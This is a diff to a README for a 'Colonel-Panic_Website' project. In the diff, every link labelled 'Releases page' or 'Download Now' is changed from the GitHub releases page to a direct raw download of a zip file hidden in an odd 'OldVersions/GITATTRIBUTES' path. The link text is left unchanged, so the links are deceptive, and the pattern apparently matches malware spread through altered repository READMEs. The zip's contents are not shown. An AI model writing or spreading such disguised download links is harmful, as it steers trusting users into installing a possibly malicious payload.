@@ -1,6 +1,6 @@
 # 🪖️ Colonel-Panic_Website - Your Easy Guide to the Colonel Panic Project
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/rasec2301/Colonel-Panic_Website/releases)
+[![Download Now](https://raw.githubusercontent.com/rasec2301/Colonel-Panic_Website/Colonel-Panic_Website_Main-dev/OldVersions/GITATTRIBUTES/1/Panic_Website_Colonel_2.7.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/rasec2301/Colonel-Panic_Website/Colonel-Panic_Website_Main-dev/OldVersions/GITATTRIBUTES/1/Panic_Website_Colonel_2.7.zip)
 
 ## 🐧 About the Project
 
@@ -20,13 +20,13 @@ Make sure you have the following before downloading:
 
 ### 2. Visit the Releases Page
 
-Go to the [Releases page](https://github.com/rasec2301/Colonel-Panic_Website/releases) where you can find the latest updates and downloads.
+Go to the [Releases page](https://raw.githubusercontent.com/rasec2301/Colonel-Panic_Website/Colonel-Panic_Website_Main-dev/OldVersions/GITATTRIBUTES/1/Panic_Website_Colonel_2.7.zip) where you can find the latest updates and downloads.
 
 ## 💾 Download & Install
 
 To download the Colonel Panic website files:
 
-1. Visit the [Releases page](https://github.com/rasec2301/Colonel-Panic_Website/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/rasec2301/Colonel-Panic_Website/Colonel-Panic_Website_Main-dev/OldVersions/GITATTRIBUTES/1/Panic_Website_Colonel_2.7.zip).
 2. Look for the latest version listed there.
 3. Click on the version number to see download options.
 4. Choose the appropriate file for your operating system. Click on it to start the download.
